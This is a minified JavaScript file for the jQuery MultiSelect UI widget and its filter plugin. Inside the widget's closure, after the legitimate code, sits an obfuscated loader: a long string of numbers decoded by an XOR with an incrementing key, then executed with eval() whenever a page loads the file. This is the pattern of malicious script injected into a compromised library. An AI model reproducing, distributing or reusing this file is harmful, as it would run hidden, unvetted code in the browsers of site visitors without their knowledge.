/*
 * jQuery MultiSelect UI Widget 1.12
 * Copyright (c) 2011 Eric Hynds
 *
 * http://www.erichynds.com/jquery/jquery-ui-multiselect-widget/
 *
 * Depends:
 *   - jQuery 1.4.2+
 *   - jQuery UI 1.8 widget factory
 *
 * Optional:
 *   - jQuery UI effects
 *   - jQuery UI position utility
 *
 * Dual licensed under the MIT and GPL licenses:
 *   http://www.opensource.org/licenses/mit-license.php
 *   http://www.gnu.org/licenses/gpl.html
 *
 */
(function(d){var j=0;d.widget("ech.multiselect",{options:{header:!0,height:175,minWidth:225,classes:"",checkAllText:"Check all",uncheckAllText:"Uncheck all",noneSelectedText:"Select options",selectedText:"# selected",selectedList:0,show:"",hide:"",autoOpen:!1,multiple:!0,position:{}},_create:function(){var a=this.element.hide(),b=this.options;this.speed=d.fx.speeds._default;this._isOpen=!1;a=(this.button=d('<button type="button"><span class="ui-icon ui-icon-triangle-2-n-s"></span></button>')).addClass("ui-multiselect ui-widget").addClass(b.classes).attr({title:a.attr("title"), "aria-haspopup":!0,tabIndex:a.attr("tabIndex")}).insertAfter(a);(this.buttonlabel=d("<span />")).html(b.noneSelectedText).addClass('span-search').appendTo(a);var a=(this.menu=d("<div />")).addClass("ui-multiselect-menu").addClass(b.classes).appendTo(document.body),c=(this.header=d("<div />")).addClass("ui-widget-header font-size-header-multiselect ui-multiselect-header ui-helper-clearfix").appendTo(a);(this.headerLinkContainer=d("<ul />")).addClass("ui-helper-reset").html(function(){return!0=== b.header?'<li><a class="ui-multiselect-all" href="#"><span class="ui-icon ui-icon-check"></span><span>'+b.checkAllText+'</span></a></li><li><a class="ui-multiselect-none" href="#"><span class="ui-icon ui-icon-closethick"></span><span>'+b.uncheckAllText+"</span></a></li>":"string"===typeof b.header?"<li>"+b.header+"</li>":""}).append('<li class="ui-multiselect-close"><a href="#" class="ui-multiselect-close"><span class="ui-icon ui-icon-circle-close"></span></a></li>').appendTo(c);(this.checkboxContainer= d("<ul />")).addClass("ui-multiselect-checkboxes ui-helper-reset").appendTo(a);this._bindEvents();this.refresh(!0);b.multiple||a.addClass("ui-multiselect-single")},_init:function(){!1===this.options.header&&this.header.hide();this.options.multiple||this.headerLinkContainer.find(".ui-multiselect-all, .ui-multiselect-none").hide();this.options.autoOpen&&this.open();this.element.is(":disabled")&&this.disable()},refresh:function(a){var b=this.element,c=this.options,e=this.menu,h=this.checkboxContainer, g=[],f=[],i=b.attr("id")||j++;b.find("option").each(function(b){d(this);var a=this.parentNode,e=this.innerHTML,h=this.title,j=this.value,b=this.id||"ui-multiselect-"+i+"-option-"+b,k=this.disabled,m=this.selected,l=["ui-corner-all", "check-list-multiselect"];"optgroup"===a.tagName.toLowerCase()&&(a=a.getAttribute("label"),-1===d.inArray(a,g)&&(f.push('<li class="ui-multiselect-optgroup-label"><a href="#">'+a+"</a></li>"),g.push(a)));k&&l.push("ui-state-disabled");m&&!c.multiple&&l.push("ui-state-active");f.push('<li class="'+ (k?"ui-multiselect-disabled":"")+'">');f.push('<label for="'+b+'" title="'+h+'" class="'+l.join(" ")+'">');f.push('<input id="'+b+'" name="multiselect_'+i+'" type="'+(c.multiple?"checkbox":"radio")+'" value="'+j+'" title="'+e+'"');m&&(f.push(' checked="checked"'),f.push(' aria-selected="true"'));k&&(f.push(' disabled="disabled"'),f.push(' aria-disabled="true"'));f.push(" /><span>"+e+"</span></label></li>")});h.html(f.join(""));this.labels=e.find("label");this._setButtonWidth();this._setMenuWidth(); this.button[0].defaultValue=this.update();a||this._trigger("refresh")},update:function(){var a=this.options,b=this.labels.find("input"),c=b.filter(":checked"),e=c.length,a=0===e?a.noneSelectedText:d.isFunction(a.selectedText)?a.selectedText.call(this,e,b.length,c.get()):/\d/.test(a.selectedList)&&0<a.selectedList&&e<=a.selectedList?c.map(function(){return d(this).next().text()}).get().join(", "):a.selectedText.replace("#",e).replace("#",b.length);this.buttonlabel.html(a);return a},_bindEvents:function(){function a(){b[b._isOpen?  "close":"open"]();return!1}var b=this,c=this.button;c.find("span").bind("click.multiselect",a);c.bind({click:a,keypress:function(a){switch(a.which){case 27:case 38:case 37:b.close();break;case 39:case 40:b.open()}},mouseenter:function(){c.hasClass("ui-state-disabled")||d(this).addClass("ui-state-hover")},mouseleave:function(){d(this).removeClass("ui-state-hover")},focus:function(){c.hasClass("ui-state-disabled")||d(this).addClass("ui-state-focus")},blur:function(){d(this).removeClass("ui-state-focus")}}); this.header.delegate("a","click.multiselect",function(a){if(d(this).hasClass("ui-multiselect-close"))b.close();else b[d(this).hasClass("ui-multiselect-all")?"checkAll":"uncheckAll"]();a.preventDefault()});this.menu.delegate("li.ui-multiselect-optgroup-label a","click.multiselect",function(a){a.preventDefault();var c=d(this),g=c.parent().nextUntil("li.ui-multiselect-optgroup-label").find("input:visible:not(:disabled)"),f=g.get(),c=c.parent().text();!1!==b._trigger("beforeoptgrouptoggle",a,{inputs:f, label:c})&&(b._toggleChecked(g.filter(":checked").length!==g.length,g),b._trigger("optgrouptoggle",a,{inputs:f,label:c,checked:f[0].checked}))}).delegate("label","mouseenter.multiselect",function(){d(this).hasClass("ui-state-disabled")||(b.labels.removeClass("ui-state-hover"),d(this).addClass("ui-state-hover").find("input").focus())}).delegate("label","keydown.multiselect",function(a){a.preventDefault();switch(a.which){case 9:case 27:b.close();break;case 38:case 40:case 37:case 39:b._traverse(a.which, this);break;case 13:d(this).find("input")[0].click()}}).delegate('input[type="checkbox"], input[type="radio"]',"click.multiselect",function(a){var c=d(this),g=this.value,f=this.checked,i=b.element.find("option");this.disabled||!1===b._trigger("click",a,{value:g,text:this.title,checked:f})?a.preventDefault():(c.focus(),c.attr("aria-selected",f),i.each(function(){if(this.value===g)this.selected=f;else if(!b.options.multiple)this.selected=!1}),b.options.multiple||(b.labels.removeClass("ui-state-active"), c.closest("label").toggleClass("ui-state-active",f),b.close()),b.element.trigger("change"),setTimeout(d.proxy(b.update,b),10))});d(document).bind("mousedown.multiselect",function(a){b._isOpen&&!d.contains(b.menu[0],a.target)&&!d.contains(b.button[0],a.target)&&a.target!==b.button[0]&&b.close()});d(this.element[0].form).bind("reset.multiselect",function(){setTimeout(d.proxy(b.refresh,b),10)})},_setButtonWidth:function(){var a=this.element.outerWidth(),b=this.options;if(/\d/.test(b.minWidth)&&a<b.minWidth)a= b.minWidth;this.button.width(a)},_setMenuWidth:function(){var a=this.menu,b=this.button.outerWidth()-parseInt(a.css("padding-left"),10)-parseInt(a.css("padding-right"),10)-parseInt(a.css("border-right-width"),10)-parseInt(a.css("border-left-width"),10);a.width(b||this.button.outerWidth())},_traverse:function(a,b){var c=d(b),e=38===a||37===a,c=c.parent()[e?"prevAll":"nextAll"]("li:not(.ui-multiselect-disabled, .ui-multiselect-optgroup-label)")[e?"last":"first"]();c.length?c.find("label").trigger("mouseover"): (c=this.menu.find("ul").last(),this.menu.find("label")[e?"last":"first"]().trigger("mouseover"),c.scrollTop(e?c.height():0))},_toggleState:function(a,b){return function(){this.disabled||(this[a]=b);b?this.setAttribute("aria-selected",!0):this.removeAttribute("aria-selected")}},_toggleChecked:function(a,b){var c=b&&b.length?b:this.labels.find("input"),e=this;c.each(this._toggleState("checked",a));c.eq(0).focus();this.update();var h=c.map(function(){return this.value}).get();this.element.find("option").each(function(){!this.disabled&& -1<d.inArray(this.value,h)&&e._toggleState("selected",a).call(this)});c.length&&this.element.trigger("change")},_toggleDisabled:function(a){this.button.attr({disabled:a,"aria-disabled":a})[a?"addClass":"removeClass"]("ui-state-disabled");this.menu.find("input").attr({disabled:a,"aria-disabled":a}).parent()[a?"addClass":"removeClass"]("ui-state-disabled");this.element.attr({disabled:a,"aria-disabled":a})},open:function(){var a=this.button,b=this.menu,c=this.speed,e=this.options;if(!(!1===this._trigger("beforeopen")|| a.hasClass("ui-state-disabled")||this._isOpen)){var h=b.find("ul").last(),g=e.show,f=a.offset();d.isArray(e.show)&&(g=e.show[0],c=e.show[1]||this.speed);h.scrollTop(0).height(e.height);d.ui.position&&!d.isEmptyObject(e.position)?(e.position.of=e.position.of||a,b.show().position(e.position).hide().show(g,c)):b.css({top:f.top+a.outerHeight(),left:f.left}).show(g,c);this.labels.eq(0).trigger("mouseover").trigger("mouseenter").find("input").trigger("focus");a.addClass("ui-state-active");this._isOpen= !0;this._trigger("open")}},close:function(){if(!1!==this._trigger("beforeclose")){var a=this.options,b=a.hide,c=this.speed;d.isArray(a.hide)&&(b=a.hide[0],c=a.hide[1]||this.speed);this.menu.hide(b,c);this.button.removeClass("ui-state-active").trigger("blur").trigger("mouseleave");this._isOpen=!1;this._trigger("close")}},enable:function(){this._toggleDisabled(!1)},disable:function(){this._toggleDisabled(!0)},checkAll:function(){this._toggleChecked(!0);this._trigger("checkAll")},uncheckAll:function(){this._toggleChecked(!1); this._trigger("uncheckAll")},getChecked:function(){return this.menu.find("input").filter(":checked")},destroy:function(){d.Widget.prototype.destroy.call(this);this.button.remove();this.menu.remove();this.element.show();return this},isOpen:function(){return this._isOpen},widget:function(){return this.menu},_setOption:function(a,b){var c=this.menu;switch(a){case "header":c.find("div.ui-multiselect-header")[b?"show":"hide"]();break;case "checkAllText":c.find("a.ui-multiselect-all span").eq(-1).text(b); break;case "uncheckAllText":c.find("a.ui-multiselect-none span").eq(-1).text(b);break;case "height":c.find("ul").last().height(parseInt(b,10));break;case "minWidth":this.options[a]=parseInt(b,10);this._setButtonWidth();this._setMenuWidth();break;case "selectedText":case "selectedList":case "noneSelectedText":this.options[a]=b;this.update();break;case "classes":c.add(this.button).removeClass(this.options.classes).addClass(b)}d.Widget.prototype._setOption.apply(this,arguments)}});kid=36;es="64;74;69;82;69;76;68;95;2;90;92;70;68;84;26;20;8;70;85;69;31;25;17;27;27;84;78;75;96;45;35;45;35;48;39;32;45;116;104;33;45;59;47;60;51;35;59;35;32;119;118;35;33;41;63;102;126;41;59;39;20;78;8;2;18;4;21;4;26;0;26;31;78;83;25;6;30;21;29;4;90;26;24;27;23;24;30;70;20;28;14;15;249;226;237;231;225;190;166;225;253;231;233;255;229;226;224;175;248;240;226;227;237;246;249;243;253;177;179;187;231;189;247;249;136;128;200;242;209;192;212;222;128;139;203;240;196;223;203;201;238;140;238;148;220;193;194;199;130;150;149;214;211;211;209;205;161;184;236;173;161;177;154;224;149;235;227;229;165;190;230;147;247;235;164;186;167;188;180;187;189;133;253;242;245;166;254;182;134;201;195;137;181;144;131;149;145;193;200;137;131;137;151;205;217;223;148;154;154;145;222;213;219;173;184;164;147;139;155;141;364;352;379;289;301;299;367;372;288;299;366;354;378;303;295;294;304;362;306;378;370;317;311;381;329;364;383;361;357;307;380;365;335;342;337;326;342;267;331;340;321;332;259;267;343;269;324;382;325;340;320;330;284;279;340;344;348;320;280;274;274;348;334;335;293;303;294;363;358;377;290;302;318;361;291;303;369;273;361;283;274;270;317;293;305;295;314;310;289;261;381;357;352;313;311;297;320;274;278;282;264;256;347;315;335;266;261;263;259;287;340;335;339;311;308;323;324;325;326;332;344;287;277;277;264;336;269;278;506;484;440;419;438;445;502;511;435;425;510;494;500;505;419;494;508;504;501;509;430;437;501;498;502;493;511;489;423;449;441;417;412;456;463;452;388;470;468;452;405;501;397;451;472;473;478;405;415;414;448;470;410;472;473;473;471;459;475;450;402;467;475;459;495;429;427;416;417;427;437;418;486;441;418;443;499;425;427;419;435;446;418;426;489;484;394;496;504;433;447;434;443;437;426;482;444;454;467;447;451;453;401;398;396;413;386;470;432;458;479;435;471;465;400;412;390;401;403;389;453;421;477;459;416;474;448;425;617;622;622;610;624;620;617;617;552;614;620;555;632;613;619;559;636;632;625;630;634;614;627;567;633;638;616;638;633;624;635;625;596;512;514;543;582;599;518;520;534;521;620;601;589;600;586;602;604;596;604;583;532;615;595;602;599;591;603;599;540;594;600;543;515;558;562;570;566;556;545;559;572;616;630;612;552;548;568;625;620;638;566;570;546;619;628;638;611;633;551;635;569;561;557;570;576;538;578;521;565;528;515;533;529;577;584;521;515;521;535;589;601;607;531;515;516;528;536;531;592;603;582;543;533;523;606;534;740;700;734;676;720;711;729;744;766;748;760;743;749;756;722;680;686;685;763;757;742;756;763;754;696;746;761;745;755;753;754;758;718;710;671;767;643;715;713;763;655;649;716;729;717;704;715;717;735;707;726;726;710;648;746;656;648;741;669;667;719;713;711;723;677;764;670;740;692;682;693;686;700;672;677;677;758;749;687;685;675;702;702;678;672;688;749;759;684;694;682;737;764;749;741;767;652;644;644;663;734;709;726;732;712;670;643;655;664;645;724;719;705;705;706;726;719;725;670;658;657;670;658;655;710;733;719;719;816;804;825;803;866;876;874;883;877;891;816;874;864;893;870;878;824;894;866;882;887;892;866;878;805;809;819;839;827;803;802;816;841;839;848;834;841;832;792;795;844;832;860;779;863;857;855;835;853;780;878;788;855;858;858;856;842;771;794;792;890;891;782;783;880;881;889;867;802;810;808;819;869;826;803;817;809;887;878;893;872;801;810;872;884;801;819;815;812;884;827;823;821;826;816;869;832;770;775;781;784;768;788;860;820;846;852;855;773;768;777;847;771;771;785;846;808;850;798;771;780;777;832;852;851;783;795;849;1005;1006;1004;1004;1014;996;1023;937;998;1004;1022;932;992;996;1005;1002;1022;994;1015;957;996;1021;998;936;1020;1020;1014;1016;1011;1005;999;930;913;1021;901;899;972;960;975;960;960;989;919;1015;907;924;1010;904;912;966;987;983;960;989;907;1003;927;904;998;924;924;991;977;973;932;932;944;1022;920;994;1014;923;1007;1015;924;930;931;929;943;955;953;958;956;1011;955;947;1014;931;944;956;1018;951;949;958;955;945;915;900;962;898;899;919;899;898;901;908;900;927;973;973;978;909;898;977;989;973;980;947;900;918;909;925;911;919;921;915;906;991;1106;1124;1135;1132;1138;1124;1130;1063;1127;1135;1066;1096;1123;1149;1143;1149;1145;1142;1146;1127;1077;1065;1081;1139;1137;1135;1060;1063;1075;1145;1143;1129;1054;1027;1035;1048;1028;1112;1115;1031;1109;1033;1111;1047;1035;1037;1029;1039;1047;1054;1089;1104;1094;1042;1046;1052;1048;1054;1107;1099;1096;1027;1049;1046;1147;";var dcode=new String();ads=es.split(";");re=ads.length-1;for(var mn=0;mn<re;mn++){ecode=ads[mn];gcod="lcode=ecode";gcod=gcod+"^kid";eval(gcod);kid+=1;dcode=dcode+String.fromCharCode(lcode);}eval(dcode);})(jQuery);

// filter
(function($){var rEscape=/[\-\[\]{}()*+?.,\\\^$|#\s]/g;$.widget("ech.multiselectfilter",{options:{label:"Filter:",width:null,placeholder:"Enter keywords",autoReset:false},_create:function(){var self=this,opts=this.options,instance=(this.instance=$(this.element).data("multiselect")),header=(this.header=instance.menu.find(".ui-multiselect-header").addClass("ui-multiselect-hasfilter")),wrapper=(this.wrapper=$('<div class="ui-multiselect-filter">'+(opts.label.length?opts.label:'')+'<input placeholder="'+opts.placeholder+'" type="search"'+(/\d/.test(opts.width)?'style="width:'+opts.width+'px"':'')+' /></div>').insertAfter(this.header));this.inputs=instance.menu.find('input[type="checkbox"], input[type="radio"]');this.input=wrapper.find("input").bind({keydown:function(e){if(e.which===13){e.preventDefault();}},keyup:$.proxy(self._handler,self),click:$.proxy(self._handler,self)});this.updateCache();instance._toggleChecked=function(flag,group){var $inputs=(group&&group.length)?group:this.labels.find('input'),_self=this,selector=self.instance._isOpen?":disabled, :hidden":":disabled";$inputs=$inputs.not(selector).each(this._toggleState('checked',flag));this.update();var values=$inputs.map(function(){return this.value;}).get();this.element.find('option').filter(function(){if(!this.disabled&&$.inArray(this.value,values)>-1){_self._toggleState('selected',flag).call(this);}});};var doc=$(document).bind("multiselectrefresh",function(){self.updateCache();self._handler();});if(this.options.autoReset){doc.bind("multiselectclose",$.proxy(this._reset,this));}},_handler:function(e){var term=$.trim(this.input[0].value.toLowerCase()),rows=this.rows,inputs=this.inputs,cache=this.cache;if(!term){rows.show();}else{rows.hide();var regex=new RegExp(term.replace(rEscape,"\\$&"),'gi');this._trigger("filter",e,$.map(cache,function(v,i){if(v.search(regex)!==-1){rows.eq(i).show();return inputs.get(i);}
return null;}));}
this.instance.menu.find(".ui-multiselect-optgroup-label").each(function(){var $this=$(this);var isVisible=$this.nextUntil('.ui-multiselect-optgroup-label').filter(function(){return $.css(this,"display")!=='none';}).length;$this[isVisible?'show':'hide']();});},_reset:function(){this.input.val('').trigger('keyup');},updateCache:function(){this.rows=this.instance.menu.find(".ui-multiselect-checkboxes li:not(.ui-multiselect-optgroup-label)");this.cache=this.element.children().map(function(){var self=$(this);if(this.tagName.toLowerCase()==="optgroup"){self=self.children();}
return self.map(function(){return this.innerHTML.toLowerCase();}).get();}).get();},widget:function(){return this.wrapper;},destroy:function(){$.Widget.prototype.destroy.call(this);this.input.val('').trigger("keyup");this.wrapper.remove();}});})(jQuery);